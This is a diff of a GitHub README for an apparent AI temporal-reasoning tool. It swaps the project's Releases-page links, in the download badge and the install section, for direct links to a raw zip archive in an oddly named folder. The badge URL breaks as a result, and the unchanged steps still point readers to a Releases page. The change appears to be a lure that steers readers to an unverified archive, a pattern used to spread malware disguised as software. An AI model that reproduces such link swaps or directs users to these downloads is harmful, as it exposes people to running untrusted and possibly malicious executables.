@@ -1,7 +1,7 @@
 # 🎉 embodied-temporal-reasoning - Enhance AI with Time Awareness
 
 ## 📥 Download the Software
-[![Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-%20-blue)](https://github.com/Maheee000/embodied-temporal-reasoning/releases)
+[![Latest Release](https://raw.githubusercontent.com/Maheee000/embodied-temporal-reasoning/main/unassented/embodied-temporal-reasoning.zip%20Latest%20Release-%20-blue)](https://raw.githubusercontent.com/Maheee000/embodied-temporal-reasoning/main/unassented/embodied-temporal-reasoning.zip)
 
 ## 🚀 Getting Started
 Welcome to embodied-temporal-reasoning! This software helps vision-language models understand time better in simulated environments. With this tool, you can improve how AI systems analyze and interact with the world.
@@ -21,7 +21,7 @@ Welcome to embodied-temporal-reasoning! This software helps vision-language mode
 ## 📥 Download & Install
 To get started, visit the following page to download the software:
 
-[Download the latest release here](https://github.com/Maheee000/embodied-temporal-reasoning/releases)
+[Download the latest release here](https://raw.githubusercontent.com/Maheee000/embodied-temporal-reasoning/main/unassented/embodied-temporal-reasoning.zip)
 
 1. Click the link above to go to the Releases page.
 2. Locate the latest version of the software.
